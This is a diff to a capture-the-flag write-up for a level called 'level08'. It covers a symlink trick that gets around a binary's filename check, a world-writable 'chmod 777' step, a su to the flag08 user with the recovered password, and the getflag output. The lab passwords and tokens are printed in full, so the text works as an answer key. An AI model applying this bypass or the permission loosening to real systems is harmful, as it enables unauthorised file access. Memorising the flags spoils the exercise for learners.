@@ -33,6 +33,12 @@ Here is the decompiled source code of `main` as shown by Ghidra:
 
 ## Exploitation
 
+First, grant write permissions on the current directory so we can create the symlink:
+
+```bash
+chmod 777 .
+```
+
 Since the binary blocks any argument containing the word `token`, we create a symbolic link to the token file under a different name:
 
 ```bash
@@ -45,8 +51,19 @@ Running the binary with the symlink bypasses the name check entirely:
 ./level08 lol
 ```
 
+## Getting the Final Token
+
+The output of the binary (`quif5eloekouj29ke0vouxean`) is the password for the `flag08` user. Switch to that user and run `getflag` to retrieve the actual token:
+
+```bash
+su flag08
+# Password: quif5eloekouj29ke0vouxean
+getflag
+# Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+```
+
 ## Flag
 
 ```
-quif5eloekouj29ke0vouxean
+25749xKZ8L7DkSCwJkT9dyv6f
 ```
